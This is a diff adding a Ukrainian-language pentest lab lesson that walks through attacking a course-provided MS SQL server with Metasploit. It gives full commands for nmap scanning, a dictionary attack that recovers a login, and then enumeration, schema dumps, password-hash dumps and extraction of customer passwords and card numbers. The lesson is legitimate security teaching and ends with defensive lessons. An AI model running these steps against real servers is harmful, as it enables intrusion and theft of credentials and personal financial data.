@@ -1,0 +1,252 @@
+<h2>Metasploit Framework</h2>
+
+<p>У цій лабораторній роботі ми попрактикуємося з <b>Metasploit</b> — одним із найважливіших інструментів в арсеналі пентестера. Це потужний набір засобів для тестування на проникнення: виявлення вразливостей у системах і їх контрольованої експлуатації.</p>
+
+<p>Ключові можливості Metasploit Framework:</p>
+
+<ul>
+  <li><b>База вразливостей:</b> відомості про відомі вразливості ПЗ, ОС, протоколів і сервісів — допомагає визначити точки входу.</li>
+  <li><b>Експлойти та модулі:</b> готові засоби для атак, віддаленого виконання коду, перехоплення сесій тощо.</li>
+  <li><b>Гнучке налаштування</b> під конкретну задачу тестування.</li>
+  <li><b>Модульна структура</b> з розширенням сторонніми модулями.</li>
+  <li><b>Керування й звітність:</b> моніторинг прогресу та детальні звіти для замовника.</li>
+</ul>
+
+<aside data-icon="⚠️">Усі дії в цій роботі виконуються проти навчального SQL-сервера, який надає курс, у межах ізольованої лабораторної мережі. Повторювати ці кроки проти будь-яких інших систем без письмового дозволу власника <b>заборонено законом</b> (стаття 361 КК України).</aside>
+
+<h2>Лабораторна робота: атака на SQL-сервер</h2>
+
+<aside data-icon="📄">Для зручності можеш виконувати роботу за <a href="https://docs.google.com/document/d/1w2fvp4yXbr9OkQXqeMuoExeZx6juklKea6lfQJHPkKs/edit" target="_blank" rel="noreferrer">цим документом</a>.</aside>
+
+<h3>Крок 1. Підключення до віртуальної машини через PuTTY</h3>
+
+<p><b>PuTTY</b> — програма для віддаленого підключення до віртуальної машини по SSH. Завантаж її з <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noreferrer">офіційного сайту</a>, обери файл під свою систему й пройди кроки встановлення. Після цього на робочому столі з'явиться ярлик:</p>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/putty-shortcut.webp" alt="Ярлик програми PuTTY на робочому столі Windows" loading="lazy" />
+  <figcaption>Ярлик PuTTY на робочому столі</figcaption>
+</figure>
+
+<ol>
+  <li>Запусти PuTTY.</li>
+  <li>У розділі <b>Session</b> введи IP-адресу (або доменне ім'я) віртуальної машини. Порт SSH за замовчуванням — 22.</li>
+  <li>Натисни <b>Open</b>, щоб встановити з'єднання.</li>
+  <li>У вікні введи ім'я користувача й пароль. Щоб уникнути помилок, їх краще скопіювати: виділи текст, натисни <code>Ctrl + C</code> і встав правою кнопкою миші у вікні PuTTY.</li>
+  <li>Пароль у PuTTY не відображається — просто введи або встав його й натисни <code>Enter</code>.</li>
+</ol>
+
+<aside data-icon="🔑">Логін, пароль та IP-адресу віртуальної машини отримуй у клієнт-менеджера (КХМ).</aside>
+
+<h3>Крок 2. Встановлення Metasploit на Ubuntu</h3>
+
+<p>Спершу онови систему й встанови залежності:</p>
+
+<pre><code>sudo apt update
+sudo apt upgrade
+sudo apt install curl gnupg apt-transport-https</code></pre>
+
+<p>Тут <code>curl</code> завантажує файли, <code>gnupg</code> працює з GPG-ключами, а <code>apt-transport-https</code> додає підтримку HTTPS-репозиторіїв.</p>
+
+<p>Завантаж і додай GPG-ключ Metasploit до довірених (для перевірки автентичності пакетів):</p>
+
+<pre><code>curl https://apt.metasploit.com/metasploit-framework.gpg.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/metasploit-archive-keyring.gpg > /dev/null</code></pre>
+
+<p>Завантаж інсталяційний скрипт з офіційного репозиторію, дай права на виконання й запусти його:</p>
+
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall</code></pre>
+
+<h3>Крок 3. Розвідка портів за допомогою Nmap</h3>
+
+<p>Встанови Nmap і проскануй підмережу SQL-сервера:</p>
+
+<pre><code>sudo apt install nmap
+nmap 10.0.1.4/24</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/nmap-scan.webp" alt="Вивід nmap: на хості 10.0.1.4 відкриті порти 135, 139, 445, 1433 (ms-sql-s), 3389; на двох інших хостах — лише 22 (ssh)" loading="lazy" />
+  <figcaption>Nmap знайшов на хості 10.0.1.4 відкритий порт <b>1433</b> (ms-sql-s) — саме той, що нам потрібен</figcaption>
+</figure>
+
+<p>Порт <b>1433</b> — стандартний порт Microsoft SQL Server. Він відкритий, тож ціль нам підходить.</p>
+
+<h3>Крок 4. Запуск Metasploit</h3>
+
+<pre><code>/opt/metasploit-framework/bin/msfconsole</code></pre>
+
+<h2>Проведення атаки</h2>
+
+<h3>Злам пароля (атака словником)</h3>
+
+<p>Сервер знайдено — тепер треба отримати до нього облікові дані. Застосуємо <b>атаку словником</b>: модуль перебере списки логінів і паролів. Спершу підготуй два файли через редактор <code>nano</code>:</p>
+
+<pre><code>use auxiliary/scanner/mssql/mssql_login
+nano user.txt        # можливі логіни для перебору
+nano passwords.txt   # можливі паролі</code></pre>
+
+<p>У <code>nano</code> вводиш по одному значенню в рядок, зберігаєш комбінацією <code>Ctrl + O</code> (потім <code>Enter</code>) і виходиш через <code>Ctrl + X</code>.</p>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/passwords-list.webp" alt="Редактор nano з файлом списку паролів: Primary0733, Temppwd001, Password@123, Password@1, password, mysql, root, admin, 123, 1234 та інші" loading="lazy" />
+  <figcaption>Список можливих паролів у nano. Аналогічно складають і <code>user.txt</code></figcaption>
+</figure>
+
+<p>Тепер вкажи ціль і файли та запусти перебір:</p>
+
+<pre><code>set rhosts 10.0.1.4
+set user_file user.txt
+set pass_file passwords.txt
+set verbose false
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-login.webp" alt="Вивід mssql_login: Login Successful: WORKSTATION\lowpriv:Password@1" loading="lazy" />
+  <figcaption>Облікові дані підібрано: <code>lowpriv : Password@1</code></figcaption>
+</figure>
+
+<p>Перебір знайшов робочу пару логін-пароль — <code>lowpriv : Password@1</code>. Далі всі модулі запускаємо вже з цими даними.</p>
+
+<h3>Версія MSSQL</h3>
+
+<p>Модуль <code>mssql_sql</code> виконує довільний SQL-запит. Запустимо <code>select @@version</code>, щоб дізнатися версію сервера:</p>
+
+<pre><code>use auxiliary/admin/mssql/mssql_sql
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-sql-version.webp" alt="Вивід mssql_sql: запит select @@version повертає Microsoft SQL Server 2012 (SP1) - 11.0.3128.0, Express Edition на Windows NT 6.2" loading="lazy" />
+  <figcaption>Сервер — Microsoft SQL Server 2012 (SP1), Express Edition</figcaption>
+</figure>
+
+<h3>Перерахування сервера (enumeration)</h3>
+
+<p>Модуль <code>mssql_enum</code> збирає загальну інформацію про сервер: параметри конфігурації, список баз даних, їхні файли, логіни, збережені процедури тощо.</p>
+
+<pre><code>use auxiliary/admin/mssql/mssql_enum
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-enum-1.webp" alt="Вивід mssql_enum: версія сервера, параметри конфігурації (xp_cmdshell вимкнено, remote access увімкнено) та список баз даних master, tempdb, model, msdb, bank з їхніми файлами" loading="lazy" />
+  <figcaption>Параметри конфігурації та бази даних сервера — серед них база <code>bank</code></figcaption>
+</figure>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-enum-2.webp" alt="Продовження виводу mssql_enum: Windows-групи з доступом, перевірка на облікові записи з однаковими логіном і паролем та з порожнім паролем, список збережених процедур з публічним дозволом на виконання" loading="lazy" />
+  <figcaption>Групи з доступом і збережені процедури з публічним дозволом на виконання</figcaption>
+</figure>
+
+<h3>Перерахування логінів SQL</h3>
+
+<p>Модуль <code>mssql_enum_sql_logins</code> дає точний список усіх логінів на сервері:</p>
+
+<pre><code>use auxiliary/admin/mssql/mssql_enum_sql_logins
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-enum-sql-logins.webp" alt="Вивід mssql_enum_sql_logins: lowpriv є sysadmin; знайдено 36 логінів, перевірено 14, серед них BUILTIN\Administrators, NT AUTHORITY\SYSTEM, lowpriv, sa" loading="lazy" />
+  <figcaption>Список логінів. Зверни увагу: <code>lowpriv</code> має роль <b>sysadmin</b> — це серйозна помилка конфігурації</figcaption>
+</figure>
+
+<aside data-icon="🎯">Модуль показав, що «низькопривілейований» обліковий запис <code>lowpriv</code> насправді має роль <b>sysadmin</b> — повний контроль над сервером. Саме такі помилки конфігурації й шукає пентестер.</aside>
+
+<h3>Вивантаження даних (dump)</h3>
+
+<p>Модуль <code>mssql_findandsampledata</code> шукає в базах стовпці за ключовими словами й показує зразки даних. Пошукаємо імена, паролі та номери карток:</p>
+
+<pre><code>use auxiliary/admin/mssql/mssql_findandsampledata
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+set sample_size 4
+set keywords FirstName|passw|credit
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-findandsampledata.webp" alt="Вивід mssql_findandsampledata: таблиця Customers бази bank з даними — номери кредитних карток (1111-2222-3333-4444 тощо), імена та паролі" loading="lazy" />
+  <figcaption>З таблиці <code>Customers</code> видобуто імена, паролі й <b>номери кредитних карток</b> клієнтів</figcaption>
+</figure>
+
+<h3>Схема бази даних (schema dump)</h3>
+
+<p>Модуль <code>mssql_schemadump</code> вивантажує схему сервера — назви баз, таблиць, стовпців та їхні типи:</p>
+
+<pre><code>use auxiliary/scanner/mssql/mssql_schemadump
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-schemadump.webp" alt="Вивід mssql_schemadump: база bank, таблиця Customers зі стовпцями CustomerID, LastName, FirstName, passw, creditcard та їхніми типами" loading="lazy" />
+  <figcaption>Схема бази <code>bank</code>: таблиця <code>Customers</code> зі стовпцями, зокрема <code>passw</code> і <code>creditcard</code></figcaption>
+</figure>
+
+<h3>Дамп хешів (hash dump)</h3>
+
+<p>Нарешті, <code>mssql_hashdump</code> вивантажує хеші паролів облікових записів сервера — їх потім можна спробувати зламати офлайн:</p>
+
+<pre><code>use auxiliary/scanner/mssql/mssql_hashdump
+set rhosts 10.0.1.4
+set username lowpriv
+set password Password@1
+exploit</code></pre>
+
+<figure data-kind="screenshot">
+  <img src="/images/lessons/b2-m5-lab/mssql-hashdump.webp" alt="Вивід mssql_hashdump: збережено хеші облікових записів sa, lowpriv та службових логінів MSSQL" loading="lazy" />
+  <figcaption>Хеші паролів облікових записів сервера, зокрема <code>sa</code> і <code>lowpriv</code></figcaption>
+</figure>
+
+<aside data-icon="🛡️">Що показала ця робота з погляду захисту: не можна давати робочим обліковим записам роль <b>sysadmin</b>; паролі (<code>Password@1</code>) мають бути складними; чутливі дані (номери карток) не можна зберігати у відкритому вигляді; доступ до порту 1433 ззовні слід обмежувати.</aside>
+
+<h2>Коротко про Metasploit</h2>
+
+<p>Metasploit — найпоширеніший фреймворк для експлуатації вразливостей. Він підтримує всі етапи тестування на проникнення: від збору інформації до постексплуатації. Є дві основні версії:</p>
+
+<div data-layout="table">
+  <table>
+    <thead>
+      <tr><th>Версія</th><th>Опис</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><b>Metasploit Pro</b></td><td>Комерційна версія з графічним інтерфейсом (GUI), що спрощує автоматизацію й керування задачами</td></tr>
+      <tr><td><b>Metasploit Framework</b></td><td>Версія з відкритим кодом, що працює через командний рядок. Встановлена на більшості дистрибутивів Linux для пентесту — саме її ми використовували</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3>Основні компоненти</h3>
+
+<ul>
+  <li><b>msfconsole</b> — основний інтерфейс командного рядка, через який ти взаємодієш з Metasploit.</li>
+  <li><b>Модулі</b> — виконують конкретні завдання (саме їх ми запускали командою <code>use</code>).</li>
+  <li><b>Інструменти</b> — окремі утиліти, як-от <code>msfvenom</code> для створення payload.</li>
+</ul>
+
+<p>Типи модулів:</p>
+
+<div data-layout="table">
+  <table>
+    <thead>
+      <tr><th>Тип модуля</th><th>Призначення</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><b>Exploit</b> (експлойт)</td><td>Код, що використовує вразливість для отримання контролю над системою</td></tr>
+      <tr><td><b>Payload</b></td><td>Код, який виконується на скомпрометованій системі після успішного експлойту</td></tr>
+      <tr><td><b>Auxiliary</b> (допоміжний)</td><td>Сканування та збір інформації — усі модулі цієї роботи були саме <code>auxiliary</code></td></tr>
+      <tr><td><b>Post</b> (постексплуатація)</td><td>Завдання після отримання доступу: збір даних, подальша експлуатація</td></tr>
+      <tr><td><b>Encoder</b> (енкодер)</td><td>Шифрує payload для обходу антивірусного ПЗ</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<aside data-icon="☝🏻">Докладніше про Metasploit — у розділі «Огляд Metasploit» або за посиланням <a href="https://tryhackme.com/room/metasploitintro" target="_blank" rel="noreferrer">tryhackme.com/room/metasploitintro</a>.</aside>
